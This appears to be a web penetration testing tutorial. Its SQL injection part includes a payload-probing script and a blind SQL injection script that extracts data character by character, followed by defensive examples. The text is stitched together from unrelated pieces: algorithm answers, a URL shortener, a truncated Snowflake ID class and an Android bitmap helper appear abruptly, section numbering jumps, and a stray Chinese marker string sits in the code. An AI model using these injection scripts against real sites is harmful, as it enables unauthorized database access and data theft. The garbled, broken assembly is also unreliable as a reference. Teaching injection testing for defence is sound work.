Network security is an important field every developer must understand. This article introduces core concepts, common tools and practical techniques of web penetration testing.

## 1. Penetration Testing Basics

### 1.1 What is Penetration Testing?

Penetration testing is a simulated hacker attack security testing method to discover security vulnerabilities in systems.

Core objectives:
- Discover potential security vulnerabilities
- Assess vulnerability severity
- Provide remediation suggestions

### 1.2 Penetration Testing Types

| Type | Description | Characteristics |
|------|-------------|-----------------|
| Black-box | Unknown system, simulate external attacker | Most realistic attack simulation |
| White-box | Full knowledge of system internals | Comprehensive testing, high efficiency |
| Gray-box | Partial knowledge of system | Balance efficiency and realism |

### 1.3 Penetration Testing Process (PTES)

1. Information Gathering -> 2. Threat Modeling -> 3. Vulnerability Analysis -> 4. Exploitation -> 5. Post-Exploitation -> 6. Reporting

## 3. Web Vulnerabilities

### 3.1 SQL Injection

User input is directly concatenated into SQL statements, allowing attackers to execute arbitrary SQL commands.

Automated injection detection script:

    import requests
    import string
    
    def check_sql_injection(url, param):
        payloads = ["'", "' OR '1'='1", "' OR 1=1 --", '" OR "1"="1', "1 AND 1=1", "1 AND 1=2"]
        baseline = requests.get(url).text
        
        for payload in payloads:
            test_url = f"{url}?{param}={requests.compat.quote(payload)}"
            response = requests.get(test_url)
            if response.text != baseline:
                return {'vulnerable': True, 'payload': payload}
        
        return {'vulnerable': False}

Blind SQL injection:

    def blind_sql_injection(url, param, query):
        CHARSET = string.ascii_lowercase + string.digits + "_}"
        result = ""
        
        for pos in range(1, 30):
            for char in CHARSET:
                payload = f"' AND SUBSTRING(({query}),{pos},1)='{char}' --"
                test_url = f"{url}?{param}={requests.compat.quote(payload)}"
                response = requests.get(test_url)
                
                if "True特征" in response.text:
                    result += char
                    print(f"Progress: {result}")
                    break
            
            if result.endswith("}"):
                break
        
        return result

Defense - Parameterized queries:

    # WRONG: Direct concatenation (DANGEROUS!)
    def bad_query(user_id):
        sql = f"SELECT * FROM users WHERE id = {user_id}"
        return execute(sql)
    
    # CORRECT: Parameterized query
    def safe_query(user_id):
        sql = "SELECT * FROM users WHERE id = ?"
        return execute(sql, (user_id,))

Secure file upload:

    import os
    import hashlib
    from werkzeug.utils import secure_filename
    
    ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}
    
    def secure_upload(file):
        # 1. Verify file size
        if file.content_length > 16 * 1024 * 1024:
            raise ValueError("File too large")
        
        # 2. Verify extension
        filename = secure_filename(file.filename)
        ext = filename.rsplit('.', 1)[1].lower()
        if ext not in ALLOWED_EXTENSIONS:
            raise ValueError("Unsupported file type")
        
        # 3. Generate random filename
        random_name = hashlib.sha256(os.urandom(32)).hexdigest() + '.' + ext
        
        # 4. Save to isolated directory
        filepath = os.path.join('/var/www/uploads/', random_name)
        file.save(filepath)
        os.chmod(filepath, 0o644)
        
        return filepath

### Q1: Merge K Sorted Lists (Hard)

```python
import heapq
from typing import List, Optional

class ListNode:
    def __init__(self, val=0, next=None):
        self.val = val
        self.next = next

def mergeKLists(lists: List[Optional[ListNode]]) -> Optional[ListNode]:
    # Time: O(N log K), Space: O(K)
    heap = []
    
    for i, node in enumerate(lists):
        if node:
            heapq.heappush(heap, (node.val, i, node))
    
    dummy = ListNode()
    current = dummy
    
    while heap:
        val, i, node = heapq.heappop(heap)
        current.next = node
        current = current.next
        
        if node.next:
            heapq.heappush(heap, (node.next.val, i, node.next))
    
    return dummy.next
```

### Q2: Sliding Window Maximum (Hard)

```python
from collections import deque
from typing import List

def maxSlidingWindow(nums: List[int], k: int) -> List[int]:
    # Time: O(N), Space: O(K)
    if not nums or k == 0:
        return []
    
    result = []
    window = deque()  # Store indices, maintain decreasing order
    
    for i, num in enumerate(nums):
        while window and window[0] < i - k + 1:
            window.popleft()
        
        while window and nums[window[-1]] < num:
            window.pop()
        
        window.append(i)
        
        if i >= k - 1:
            result.append(nums[window[0]])
    
    return result

# Test
nums = [1, 3, -1, -3, 5, 3, 6, 7]
k = 3
print(maxSlidingWindow(nums, k))  # [3, 3, 5, 5, 6, 7]
```

```python
class ShortUrlSystem:
    def __init__(self):
        self.long_to_short = {}
        self.short_to_long = {}
        self.counter = 1000000
    
    def generate_short_url(self, long_url: str) -> str:
        if long_url in self.long_to_short:
            return self.long_to_short[long_url]
        
        self.counter += 1
        short_code = self.base62_encode(self.counter)
        short_url = f"http://short.cn/{short_code}"
        
        self.long_to_short[long_url] = short_url
        self.short_to_long[short_url] = long_url
        
        return short_url
    
    def base62_encode(self, num: int) -> str:
        chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
        if num == 0:
            return chars[0]
        result = []
        while num:
            num, rem = divmod(num, 62)
            result.append(chars[rem])
        return ''.join(reversed(result))

class SnowflakeID:
    def __init__(self, datacenter_id=1, worker_id=1):

        self.worker_id = worker_id
```

```java
public class BitmapUtils {
    public static Bitmap decodeSampledBitmap(String path, int w, int h) {
        BitmapFactory.Options options = new BitmapFactory.Options();
        options.inJustDecodeBounds = true;
        BitmapFactory.decodeFile(path, options);
        
        options.inSampleSize = calculateInSampleSize(options, w, h);
        options.inJustDecodeBounds = false;
        return BitmapFactory.decodeFile(path, options);
    }
    
    private static int calculateInSampleSize(BitmapFactory.Options opts, int w, int h) {
        int sampleSize = 1;
        if (opts.outHeight > h || opts.outWidth > w) {
            int halfH = opts.outHeight / 2;
            int halfW = opts.outWidth / 2;
            while ((halfH / sampleSize) >= h && (halfW / sampleSize) >= w) {
                sampleSize *= 2;
            }
        }
        return sampleSize;
    }
}
```
